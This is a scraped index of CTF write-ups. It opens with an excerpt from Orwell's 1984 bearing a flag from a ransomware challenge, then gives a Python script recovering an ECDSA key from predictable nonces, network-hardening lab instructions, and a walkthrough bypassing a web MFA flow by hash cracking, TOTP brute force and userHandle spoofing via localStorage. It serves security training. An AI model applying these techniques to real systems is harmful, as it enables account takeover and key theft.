varied\nfrom day to day, but there was none in which Goldstein was not the principal\nfigure. He was the primal traitor, the earliest defiler of the Party\u00e2s purity. All\nsubsequent crimes against the Party, all treacheries, acts of sabotage, heresies,\ndeviations, sprang directly out of his teaching. Somewhere or other he was still\nalive and hatching his conspiracies: perhaps somewhere beyond the sea, under\nthe protection of his foreign paymasters, perhaps even \u00e2 so it was occasionally\nrumoured \u00e2 in some hiding-place in Oceania itself.\nWinston\u00e2s diaphragm was constricted. He could never see the face of Goldstein without a painful mixture of emotions. It was a lean Jewish face, with a\ngreat fuzzy aureole of white hair and a small goatee beard \u00e2 a clever face, and\nyet somehow inherently despicable, with a kind of senile silliness in the long thin\nnose, near the end of which a pair of spectacles was perched. It resembled the\n6\nface of a sheep, and the voice, too, had a sheep-like quality. Goldstein was delivering his usual venomous attack upon the doctrines of the Party \u00e2 an attack\nso exaggerated and perverse that a child should have been able to see through\nit, and yet just plausible enough to fill one with an alarmed feeling that other\npeople, less level-headed than oneself, might be taken in by it. He was abusing\nBig Brother, he was denouncing the dictatorship of the Party, he was demanding the immediate conclusion of peace with Eurasia, he was advocating freedom\nof speech, freedom of the Press, freedom of assembly, freedom of thought, he\nwas crying hysterically that the revolution had been betrayed \u00e2 and all this\nin rapid polysyllabic speech which was a sort of parody of the habitual style of\nthe orators of the Party, and even contained Newspeak words: more Newspeak\nwords, indeed, than any Party member would normally use in real life. And all\nthe while, lest one should be in any doubt as to the reality which Goldstein\u00e2s\nspecious claptrap covered, behind his head on the telescreen there marched the\nendless columns of the Eurasian army \u00e2 row after row of solid-looking men\nwith expressionless Asiatic faces, who swam up to the surface of the screen and\nvanished, to be replaced by others exactly similar. The dull rhythmic tramp of\nthe soldiers\u00e2 boots formed the background to Goldstein\u00e2s bleating voice.\nBefore the Hate had proceeded for thirty seconds, uncontrollable exclamations of rage were breaking out from half the people in the room. The selfsatisfied sheep-like face on the screen, and the terrifying power of the Eurasian\narmy behind it, were too much to be borne: besides, the sight or even the\nthought of Goldstein produced fear and anger automatically. csd{73rr1bl3_R4ns0m3w3r3_4l50_67_15_d34d} He was an object\nof hatred more constant than either Eurasia or Eastasia, since when Oceania\nwas at war with one of these Powers it was generally at peace with the other.\nBut what was strange was that although Goldstein was hated and despised\nby everybody, although every day and a thousand times a day, on platforms,\non the telescreen, in newspapers, in books, his theories were refuted, smashed,\nridiculed, held up to the general gaze for the pitiful rubbish that they were in\nspite of all this, his influence never seemed to grow less. Always there were\nfresh dupes waiting to be seduced by him. A day never passed when spies and\nsaboteurs acting under his directions were not unmasked by the Thought Police. He was the commander of a vast shadowy army, an underground network\nof conspirators dedicated to the overthrow of the State. The Brotherhood, its\nname was supposed to be. There were also whispered stories of a terrible book,\na compendium of all the heresies, of which Goldstein was the author and which\ncirculated clandestinely here and there. It was a book without a title. People\nreferred to it, if at all, simply as the book. But one knew of such things only\nthrough vague rumours. Neither the Brotherhood nor the book was a subject\nthat any ordinary Party member would mention if there was a way of avoiding\nit.\nIn its second minute the Hate rose to a frenzy. People were leaping up\nand down in their places and shouting at the tops of their voices in an effort\nto drown the maddening bleating voice that came from the screen. The little\nsandy-haired woman had turned bright pink, and her mouth was opening and\nshutting like that of a landed fish. Even O\u00e2Brien\u00e2s heavy face was flushed. He\nwas sitting very straight in his chair, his powerful chest swelling and quivering\nas though he were standing up to the assault of a wave. The dark-haired girl\nbehind Winston had begun crying out \u00e2Swine! Swine! Swine!\u00e2 and suddenly\nshe picked up a heavy Newspeak dictionary and flung it at the screen. It struck\n7\nGoldstein\u00e2s nose and bounced off; the voice continued inexorably. In a lucid\nmoment Winston found that he was shouting with the others and kicking his\nheel violently against the rung of his chair. The horrible thing about the Two\nMinutes Hate was not that one was obliged to act a part, but, on the contrary,\nthat it was impossible to avoid joining in. Within thirty seconds any pretence\nwas always unnecessary. A hideous ecstasy of fear and vindictiveness, a desire\nto kill, to torture, to smash faces in with a sledge-hammer, seemed to flow\nthrough the whole group of people like an electric current, turning one even\nagainst one\u00e2s will into a grimacing, screaming lunatic. And yet the rage that\none felt was an abstract, undirected emotion which could be switched from one\nobject to another like the flame of a blowlamp. Thus, at one moment Winston\u00e2s\nhatred was not turned against Goldstein at all, but, on the contrary, against\nBig Brother, the Party, and the Thought Police; and at such moments his heart\nwent out to the lonely, derided heretic on the screen, sole guardian of truth and\nsanity in a world of lies. And yet the very next instant he was at one with the\npeople about him, and all that was said of Goldstein seemed to him to be true.\nAt those moments his secret loathing of Big Brother changed into adoration,\nand Big Brother seemed to tower up, an invincible, fearless protector, standing\nlike a rock against the hordes of Asia, and Goldstein, in spite of his isolation,\nhis helplessness, and the doubt that hung about his very existence, seemed like\nsome sinister enchanter, capable by the mere power of his voice of wrecking the\nstructure of civilization.\nIt was even possible, at moments, to switch one\u00e2s hatred this way or that\nby a voluntary act. Suddenly, by the sort of violent effort with which one\nwrenches one\u00e2s head away from the pillow in a nightmare, Winston succeeded in\ntransferring his hatred from the face on the screen to the dark-haired girl behind\nhim. Vivid, beautiful hallucinations flashed through his mind. He would flog\nher to death with a rubber truncheon. He would tie her naked to a stake and\nshoot her full of arrows like Saint Sebastian. He would ravish her and cut her\nthroat at the moment of climax. Better than before, moreover, he realized why\nit was that he hated her. He hated her because she was young and pretty and\nsexless, because he wanted to go to bed with her and would never do so, because\nround her sweet supple waist, which seemed to ask you to encircle it with your\narm, there was only the odious scarlet sash, aggressive symbol of chastity.\nThe Hate rose to its climax. The voice of Goldstein had become an actual\nsheep\u00e2s bleat, and for an instant the face changed into that of a sheep. Then\nthe sheep-face melted into the figure of a Eurasian soldier who seemed to be advancing, huge and terrible, his sub-machine gun roaring, and seeming to spring\nout of the surface of the screen, so that some of the people in the front row\nactually flinched backwards in their seats. But in the same moment, drawing a\ndeep sigh of relief from everybody, the hostile figure melted into the face of Big\nBrother, black-haired, black-moustachio\u00e2d, full of power and mysterious calm,\nand so vast that it almost filled up the screen. Nobody heard what Big Brother\nwas saying. It was merely a few words of encouragement, the sort of words that\nare uttered in the din of battle, not distinguishable individually but restoring\nconfidence by the fact of being spoken. Then the face of Big Brother faded away\nagain, and instead the three slogans of the Party stood out in bold capitals:\nWAR IS PEACE\nFREEDOM IS SLAVERY\nIGNORANCE IS STRENGTH\n8\nBut the face of Big Brother seemed to persist for several seconds on the\nscreen, as though the impact that it had made on everyone\u00e2s eyeballs was too\nvivid to wear off immediately. The little sandy-haired woman had flung herself\nforward over the back of the chair in front of her. With a tremulous murmur\nthat sounded like \u00e2My Saviour!\u00e2 she extended her arms towards the screen.\nThen she buried her face in her hands. It was apparent that she was uttering a\nprayer.\nAt this moment the entire group of people broke into a deep, slow, rhythmical chant of \u00e2B-B! ... B-B!\u00e2 \u00e2 over and over again, very slowly, with a long\npause between the first \u00e2B\u00e2 and the second-a heavy, murmurous sound, somehow curiously savage, in the background of which one seemed to hear the stamp\nof naked feet and the throbbing of tom-toms. For perhaps as much as thirty\nseconds they kept it up. It was a refrain that was often heard in moments of\noverwhelming emotion. Partly it was a sort of hymn to the wisdom and majesty\nof Big Brother, but still more it was an act of self-hypnosis, a deliberate drowning of consciousness by means of rhythmic noise. Winston\u00e2s entrails seemed to\ngrow cold. In the Two Minutes Hate he could not help sharing in the general\ndelirium, but this sub-human chanting of \u00e2B-B! ... B-B!\u00e2 always filled him with\nhorror. Of course he chanted with the rest: it was impossible to do otherwise.\nTo dissemble your feelings, to control your face, to do what everyone else was\ndoing, was an instinctive reaction. But there was a space of a couple of seconds\nduring which the expression of his eyes might conceivably have betrayed him.\nAnd it was exactly at this moment that the significant thing happened \u00e2 if,\nindeed, it did happen.\nMomentarily he caught O\u00e2Brien\u00e2s eye. O\u00e2Brien had stood up. He had taken\noff his spectacles and was in the act of resettling them on his nose with his\ncharacteristic gesture. But there was a fraction of a second when their eyes\nmet, and for as long as it took to happen Winston knew \u00e2 yes, he knew! \u00e2\nthat O\u00e2Brien was thinking the same thing as himself. An unmistakable message\nhad passed. It was as though their two minds had opened and the thoughts were\nflowing from one into the other through their eyes. \u00e2I am with you,\u00e2 O\u00e2Brien\nseemed to be saying to him. \u00e2I know precisely what you are feeling. I know all\nabout your contempt, your hatred, your disgust. But don\u00e2t worry, I am on your\nside!\u00e2 And then the flash of intelligence was gone, and O\u00e2Brien\u00e2s face was as\ninscrutable as everybody else\u00e2s.\nThat was all, and he was already uncertain whether it had happened. Such\nincidents never had any sequel. All that they did was to keep alive in him\nthe belief, or hope, that others besides himself were the enemies of the Party.\nPerhaps the rumours of vast underground conspiracies were true after all \u00e2\nperhaps the Brotherhood really existed! It was impossible, in spite of the endless\narrests and confessions and executions, to be sure that the Brotherhood was\nnot simply a myth. Some days he believed in it, some days not. There was no\nevidence, only fleeting glimpses that might mean anything or nothing: snatches\nof overheard conversation, faint scribbles on lavatory walls \u00e2 once, even, when\ntwo strangers met, a small movement of the hand which had looked as though\nit might be a signal of recognition. It was all guesswork: very likely he had\nimagined everything. He had gone back to his cubicle without looking at O\u00e2Brien\nagain. The idea of following up their momentary contact hardly crossed his\nmind. It would have been inconceivably dangerous even if he had known how to\nset about doing it. For a second, two seconds, they had exchanged an equivocal\n9\nglance, and that was the end of the story. But even that was a memorable event,\nin the locked loneliness in which one had to live.\nWinston roused himself and sat up straighter. He let out a belch. The gin\nwas rising from his stomach.\nHis eyes re-focused on the page. He discovered that while he sat helplessly\nmusing he had also been writing, as though by automatic action. And it was\nno longer the same cramped, awkward handwriting as before. His pen had slid\nvoluptuously over the smooth paper, printing in large neat capitals\nDOWN WITH BIG BROTHER\nDOWN WITH BIG BROTHER\nDOWN WITH BIG BROTHER\nDOWN WITH BIG BROTHER\nDOWN WITH BIG BROTHER\nover and over again, filling half a page.\nHe could not help feeling a twinge of panic. It was absurd, since the writing\nof those particular words was not more dangerous than the initial act of opening\nthe diary, but for a moment he was tempted to tear out the spoiled pages and\nabandon the enterprise altogether.\nHe did not do so, however, because he knew that it was useless. Whether\nhe wrote DOWN WITH BIG BROTHER, or whether he refrained from writing\nit, made no difference. Whether he went on with the diary, or whether he did\nnot go on with it, made no difference. The Thought Police would get him just\nthe same. He had committed \u00e2 would still have committed, even if he had\nnever set pen to paper \u00e2 the essential crime that contained all others in itself.\nThoughtcrime, they called it. Thoughtcrime was not a thing that could be\nconcealed for ever. You might dodge successfully for a while, even for years, but\nsooner or later they were bound to get you.\nIt was always at night \u00e2 the arrests invariably happened at night. The\nsudden jerk out of sleep, the rough hand shaking your shoulder, the lights glaring\nin your eyes, the ring of hard faces round the bed. In the vast majority of cases\nthere was no trial, no report of the arrest. People simply disappeared, always\nduring the night. Your name was removed from the registers, every record of\neverything you had ever done was wiped out, your one-time existence was denied\nand then forgotten. You were abolished, annihilated: vaporized was the usual\nword.\nFor a moment he was seized by a kind of hysteria. He began writing in a\nhurried untidy scrawl:\ntheyll shoot me i don\u00e2t care theyll shoot me in the back of the neck i dont\ncare down with big brother they always shoot you in the back of the neck i dont\ncare down with big brother\nHe sat back in his chair, slightly ashamed of himself, and laid down the pen.\nThe next moment he started violently. There was a knocking at the door.\nAlready! He sat as still as a mouse, in the futile hope that whoever it was\nmight go away after a single attempt. But no, the knocking was repeated. The\nworst thing of all would be to delay. His heart was thumping like a drum, but\nhis face, from long habit, was probably expressionless. He got up and moved\nheavily towards the door.  \n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_11_Syndiware/#mitre-attck-mapping","title":"MITRE ATT&amp;CK Mapping","text":"Technique ID Data Encrypted for Impact T1486 Obfuscated Files T1027 Masquerading T1036 User Execution T1204 <p>csd{73rr1bl3_R4ns0m3w3r3_4l50_67_15_d34d}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_12_Re-Key-very/","title":"Re-Key-Very","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_12_Re-Key-very/#day-12-re-key-very","title":"day 12 Re-Key-very","text":"<p>category : cryptography</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_12_Re-Key-very/#description","title":"Description","text":"<p>The Krampus Syndicate proudly claims their new signing service uses \"bitcoin-level encryption\" and industry-standard elliptic-curve cryptography. According to their engineers, the system is mathematically sound, battle-tested, and designed so that there is absolutely no way to recover the signing key, even if you can see every signature it produces.</p> <p>To prove their point, they've released a small transcript of signed messages. No private material and no access to the signer - just a few legitimate signatures generated with all the best practices of 2025.</p> <p>Your task is to audit that claim. You can assume the cryptography itself is correct, and the curve is secure. Brute force, as always, won't help you here. The weakness, if any, lies not in the math that's there, but in how it might be used. Carefully model the signing process and determine whether the Syndicate's confidence is actually justified.</p> <p>If they're right, the key is unrecoverable, and the holidays may turn dark once again.</p> <p>If they're wrong, however, you'll prove that even their \"bitcoin-level encryption\" can fall apart under the smallest implementation oversight.</p> <p>Of course, knowing the operative you are, you can easily surmount this. Recover the hidden secret.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_12_Re-Key-very/#attachments","title":"Attachments","text":"<p>gen.py</p> <p>out.txt</p> <p>solver</p> <pre><code>import hashlib\n\n# secp256k1 order\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\ndef inv(a, m=n):\n    return pow(a, m-2, m)\n\ndef H(m: bytes) -&gt; int:\n    return int.from_bytes(hashlib.sha256(m).digest(), \"big\")\n\nmsgs = [\n    b\"Beware the Krampus Syndicate!\",\n    b\"Santa is watching...\",\n    b\"Good luck getting the key\"\n]\n\nr0 = int(\"a4312e31e6803220d694d1040391e8b7cc25a9b2592245fb586ce90a2b010b63\", 16)\ns0 = int(\"e54321716f79543591ab4c67e989af3af301e62b3b70354b04e429d57f85aa2e\", 16)\nr1 = int(\"6c5f7047d21df064b3294de7d117dd1f7ccf5af872d053f12bddd4c6eb9f6192\", 16)\ns1 = int(\"1ccf403d4a520bc3822c300516da8b29be93423ab544fb8dbff24ca0e1368367\", 16)\nr2 = int(\"2c15aceb49e63e4a2c8357102fbd345ac2cbd1b214c77fba0cd9ffe8d20d2c1e\", 16)\ns2 = int(\"1ee49ef3857ad1d9ff3109bfb4a91cb464ab6fdc88ace610ead7e6dee0957d95\", 16)\n\nz0, z1, z2 = map(H, msgs)\n\nDelta = (s0*r1 - r0*s1) % n\nd = ((z0*s1 + s0*(s1 - z1)) % n) * inv(Delta) % n\nk = ((r0*(s1 - z1) + r1*z0) % n) * inv(Delta) % n\n\n# sanity check with 3rd signature (nonce should be k+2)\nassert (z2 + r2*d) % n == (s2 * ((k+2) % n)) % n\n\n# gen.py does: d = (int(key) % (n-1)) + 1  =&gt; key_int = d-1 (for usual case)\nkey_int = (d - 1) % (n - 1)\nflag = key_int.to_bytes((key_int.bit_length()+7)//8, \"big\")\nprint(flag.decode())\n</code></pre> <p>flag :</p> <p><code>csd{pr3d1ct4bl3_n0nc3_==_w34k}</code></p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_13_Holiday-Routing/","title":"Holiday Routing","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_13_Holiday-Routing/#day-13-holiday-routing","title":"day 13 Holiday Routing","text":"<p>category : Miscellaneous</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_13_Holiday-Routing/#description","title":"Description","text":"<p>The elves have been brushing up on their cybersecurity skills, and lately, they\u2019ve taken a liking to CyberPatriot-style network hardening. After a routine workshop in the North Pole\u2019s Network Operations Center, something feels... unfinished.</p> <p>Your task is to step into the role of a junior NetOps elf and bring order to a small but critical enterprise network. Routers, switches, routing protocols, and access controls all need a careful review. The infrastructure mostly works, but \u201cmostly\u201d isn\u2019t good enough when toy production depends on uptime.</p> <p>Nothing here is flashy. Nothing here is magical. Just solid, disciplined network configuration, the kind Santa trusts.</p> <p>https://living-shandeigh-idkwtps-3a828bc0.koyeb.app/\u00a0(temporary link for now; may change soon)</p> <p>Notes/Corrections:</p> <ul> <li>It will give you the flag after 85%+ completion</li> <li>Use PacketTracer v9.0.0</li> <li>Enable the authentication globally for Area 0 under the router ospf process, rather than enabling it on the individual interfaces.</li> <li>For the Branch Router OSPF configuration, advertise the LAN networks using a single network statement that covers the entire 192.168.100.0/24 block</li> <li><code>Create a Named Extended ACL called 'SECURE_HQ'</code>\u00a0- Apply this ACL outbound on the HQ Router's LAN interface (G0/0/1) to filter traffic as it exits the router toward the Server.</li> <li>Configure OSPF to suppress updates on the LAN interface. You must explicitly name the interface.</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_13_Holiday-Routing/#attachments","title":"Attachments","text":"<p>adventofctf2025.pka</p> <p>https://living-shandeigh-idkwtps-3a828bc0.koyeb.app/ </p> <pre><code>#PT aaactivity\nInstructions\n\nDo not move cables or change the physical topology.\nDo not remove the \"ISP\" router configurations.\nYou will not receive a completion flag until you score at least 90%.\n1. IP Addressing &amp; Subnetting\nConfigure the interfaces based on the table below.\nSubnetting: You are given the block 192.168.100.0/24 for the Branch LANs.\nVLAN 10 (Staff): Assign the first valid /26 subnet. (Gateway is first usable).\nVLAN 20 (Guest): Assign the second valid /26 subnet. (Gateway is first usable).\nHQ WAN: 10.0.0.0/30 (HQ is .1, ISP is .2)\nBranch WAN: 10.0.0.4/30 (Branch is .5, ISP is .6)\n2. Switch Security (Layer 2)\nBranch-Switch:\nVLANs: Create VLAN 10 (\"Staff\") and VLAN 20 (\"Guest\").\nTrunking: Configure the link to the router (Fa0/1) as a Trunk. Disable DTP (use switchport nonegotiate).\nAccess Ports:\nPC 1 (Fa0/2) -&gt; VLAN 10.\nPC 2 (Fa0/3) -&gt; VLAN 20.\nPort Security:\nEnable Port Security on Fa0/2 and Fa0/3.\nAllow a maximum of 1 MAC address.\nConfiguration type: Sticky.\nViolation mode: Restrict.\n Administratively shut down all unused FastEthernet ports.\nHQ-Switch:\nEnsure the Server connected to Fa0/2 is in VLAN 1 (Default).\nConfigure the uplink to the router (G0/0/1) as an Access port in VLAN 1.\n3. Routing &amp; Connectivity (Layer 3)\nOSPF Configuration:\nConfigure OSPF Process ID 1 on HQ-Router, Branch-Router, and ISP-Router.\nUse Area 0 for all networks.\nAdvertise all directly connected networks.\nSecurity: Configure MD5 Authentication on the WAN links between HQ&lt;-&gt;ISP and Branch&lt;-&gt;ISP.\nKey ID: 1\nKey: \"Cisc0Rout3s\"\nPassive Interfaces: Ensure OSPF updates are not sent out to the LAN interfaces (Gigabit ports facing the switches).\n4. Access Control Lists (ACLs)\nHQ-Router Security:\nCreate a Named Extended ACL called \"SECURE_HQ\".\nRules:\nPermit HTTP traffic from the Branch VLAN 10 network to the HQ Server.\nPermit ICMP (Ping) from the Branch VLAN 10 network to the HQ Server.\nDeny all other IP traffic from the Branch VLAN 20 network to the HQ LAN.\nPermit all other traffic.\nApplication: Apply this ACL to the most appropriate interface and direction to filter traffic entering the HQ network.\n5. Device Hardening\nAll Routers:\nSet the Enable Secret to \"Hard3n3d!\"\nCreate a user \"NetOps\" with secret \"AdminPass\"\nConfigure SSH (Version 2, Domain nexus.corp, 1024 bit key).\nDisable ip http server and ip http secure-server.\nCheck Results:\nSubmit the flag to the website provided.\n</code></pre> <p>adventofctf2025.pka</p> <p></p> <p>csd{C1sc0_35_muy_m4l_e290bgk7o5}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/","title":"Multifactorial","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#day-14-multifactorial","title":"day 14 Multifactorial","text":"<p>category : web exploit</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#description","title":"Description","text":"<p>Modern authentication relies on more than just a password.</p> <p>Something you know, something you have, and something you are. Together, they're meant to provide layered security that can withstand compromise of any single factor.</p> <p>Santa's workshop follows this model to the letter. A password gates access, a time-based code confirms possession, and a passkey verifies identity using modern cryptography. Each step appears independent. Each check appears correct.</p> <p>Analyze the authentication flow end-to-end. If multifactor authentication is only as strong as its weakest link, can you find the point where identity becomes a matter of belief rather than proof?</p> <p>https://multifactorial.csd.lol/</p> <p>You are only allowed to test in the scope\u00a0<code>https://multifactorial.csd.lol/*</code>.\u00a0Blind brute-force request sending (e.g. using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you wish to brute-force, please limit your wordlists or attack scope.</p> <p>hint 1</p> <p>Stage 1: Look in the obfuscated JS code in the script tag. Do you notice anything among the strings? How are passwords commonly stored, and how can they be reversed?</p> <p>Stage 2: Again, look in the code, do you see any values in a request that can modified? Perhaps, they reveal some\u00a0useful information. Remember, a TOTP is usually six digits and often resets every 30 seconds (at :00 and :30 seconds).</p> <p>Stage 3: The\u00a0<code>userHandle</code>\u00a0field in\u00a0<code>POST /api/webauthn/auth/verify</code>\u00a0may be in your interest. Does the server\u00a0really\u00a0verify that field? Try different names for the passkeys. How does the\u00a0<code>userHandle</code>\u00a0change? If something is always the same length, what could it be? Remember, your goal is to impersonate the\u00a0<code>santa</code>\u00a0user.</p> <p>And for all the stages, remember that you can trivially determine what type of hash something is.</p> <p>hint 2</p> <p>Stage 1: There is a SHA-256 hash hidden in the script tag among the obfuscated code. Are you able to reverse it, perhaps by brute forcing? If you can't get it working locally, there are online tools to do this as well, like hashes.com.</p> <p>Stage 2:\u00a0<code>HMAC = sha256(secret_key, message)</code>. The\u00a0<code>message</code>\u00a0is just the six-digit TOTP code (and there are only 999,999 possibilities of that!).</p> <p>Stage 3: If stage 1 has SHA-256, stage 2 has SHA-256, then stage 3 must... yep! Also have SHA-256! Also, SHA256 doesn't always output in hex. Try creating a userHandle yourself with\u00a0<code>santa</code>\u00a0instead of the passkey's name.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#overview","title":"Overview","text":"<p>This challenge simulates a modern Multi-Factor Authentication (MFA) system consisting of:</p> <ol> <li>Something You Know \u2192 Password</li> <li>Something You Have \u2192 TOTP (Time-based One-Time Password)</li> <li>Something You Are \u2192 Passkey (WebAuthn)</li> </ol>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#stage-1-something-you-know-password","title":"STAGE 1 Something You Know (Password)","text":"<p>Login using username + password</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#information-obtained","title":"Information Obtained","text":"<p>You obtained the following credentials:</p> <pre><code>bf33632dd9668787878890cb4fbb54261b6b7571:northpole123\n</code></pre> <p>Meaning:</p> <ul> <li><code>bf33632dd9668787878890cb4fbb54261b6b7571</code> \u2192 hash</li> <li><code>northpole123</code> \u2192 plaintext password</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#concept-cracking-the-hash","title":"Concept: Cracking the Hash","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#what-is-a-hash","title":"What is a hash?","text":"<ul> <li>Hash = one-way function</li> <li>Used to store passwords securely</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#how-can-it-be-cracked","title":"How can it be \u201ccracked\u201d?","text":"<p>Not reversing the hash, but:</p> <ul> <li>Trying common passwords</li> <li>Hashing those passwords</li> <li>Compare with the target hash</li> </ul> <p>Example:</p> <pre><code>hash(\"northpole123\") == bf33632dd9668787878890cb4fbb54261b6b7571\n</code></pre> <p>Valid password found.</p> <p>Login successful \u2192 redirected to Stage 2 (TOTP)</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#stage-2-something-you-have-totp","title":"STAGE 2 Something You Have (TOTP)","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#purpose","title":"Purpose","text":"<p>Bypass TOTP verification without knowing the secret key.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#initial-observations","title":"Initial Observations","text":"<p>Request to TOTP verification endpoint:</p> <pre><code>POST /api/something-you-have-verify?debug=1\n</code></pre> <p>Server response:</p> <pre><code>{\n\"error\":\"Invalid TOTP code.\",\n\"hmac\":\"20415574891d2dd8d79b5be5b2ad93b656bc38cd8a0c9ac71fc3cd1afcbf88cb\",\n\"serverTime\":1766093085\n}\n</code></pre> <p>Sensitive information leaked:</p> <ul> <li><code>serverTime</code></li> <li><code>hmac</code></li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#vulnerability-analysis","title":"Vulnerability Analysis","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#how-totp-works-normally","title":"How TOTP works (normally)","text":"<ol> <li>Server and client share a secret</li> <li>TOTP is calculated from:</li> </ol> <pre><code>TOTP=Truncate(HMAC(secret,floor(time/30)))\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#design-error","title":"Design Error","text":"<ul> <li>Server:</li> <li>Leaks <code>serverTime</code></li> <li>Leaks <code>HMAC</code> output</li> <li>Secret is never effectively kept secret</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#exploitation","title":"Exploitation","text":"<ol> <li>Use <code>serverTime</code> as the reference time</li> <li>Reconstruct the HMAC-SHA256 algorithm</li> <li>Brute-force the TOTP space (6 digits)</li> <li>Search for code that produces the same HMAC</li> </ol> <p>Automatic script generates:</p> <pre><code>[+] code: 322576\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#result","title":"Result","text":"<pre><code>{\"success\":true,\"message\":\"TOTP correct. Proceed to passkey stage.\"}\n</code></pre> <p>Stage 2 successfully passed without knowing the TOTP secret.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#stage-3-something-you-are-passkey-webauthn","title":"STAGE 3 Something You Are (Passkey / WebAuthn)","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#objective","title":"Objective","text":"<p>Log in as Santa (admin) without having a Santa passkey.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#step-1-passkey-registration-regular-user","title":"Step 1: Passkey Registration (Regular User)","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#action","title":"Action","text":"<ul> <li>Access:</li> </ul> <pre><code>/register-passkey\n</code></pre> <ul> <li>Registering a passkey as a regular user</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#server-output","title":"Server Output:","text":"<pre><code>Credential ID: g2btPG_mj4erObRxqJ3iOQ\nInternal ID (userHandle): n4bQgYhMfWWaL-qgxVrQFQ\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#technical-explanation","title":"Technical Explanation","text":"<ul> <li>Credential ID \u2192 Public key ID</li> <li>userHandle \u2192 Internal user ID (unsigned)</li> <li>Passkey:</li> <li>Private key stored in the OS</li> <li>Server only stores public key + metadata</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#client-storage","title":"Client Storage","text":"<p>The frontend stores this data in <code>localStorage</code>:</p> <pre><code>localStorage.setItem(\"np_userHandle\", userHandle);\nlocalStorage.setItem(\"np_credId\", credId);\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#step-2-manipulating-localstorage","title":"Step 2: Manipulating localStorage","text":"<p>Because <code>localStorage</code> is completely client-controlled, an attacker can change its identity:</p> <pre><code>localStorage.setItem(\"np_userHandle\",\"ttyQg9o3L-0hGazhGum6hw\");\nlocalStorage.setItem(\"np_name\",\"santa\");\n</code></pre> <p><code>ttyQg9o3L-0hGazhGum6hw</code> is Santa's userHandle.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#step-3-login-passkey","title":"Step 3 Login Passkey","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#action_1","title":"Action","text":"<ul> <li>Click Use Passkey</li> <li>Browser:</li> <li>Sign the challenge with a regular user's private key</li> <li>Send the payload:</li> </ul> <pre><code>{\n\"id\":\"g2btPG_mj4erObRxqJ3iOQ\",\n\"userHandle\":\"ttyQg9o3L-0hGazhGum6hw\",\n\"signature\":\"VALID_SIGNATURE\"\n}\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#major-vulnerabilities","title":"Major Vulnerabilities","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#server-fatal-error","title":"Server fatal error:","text":"<ul> <li>*Server trusts client's <code>userHandle</code></li> </ul> <p>Server only checks:</p> <ul> <li>Signature is valid \u2192 \u2714</li> <li>UserHandle exists \u2192 \u2714</li> </ul> <p>Not checked:</p> <ul> <li>Does this credential belong to this user</li> <li>Does the userHandle match Public Key</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#impact","title":"Impact","text":"<p>Attacker:</p> <ul> <li>Using their own passkey</li> <li>Claiming another user's identity</li> <li>Server accepting the claim</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#login-results","title":"Login Results","text":"<pre><code>Logged in as santa.\nTry /admin\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_14_Multifactorial/#flag","title":"Flag","text":"<p>Accessing <code>/admin</code>:</p> 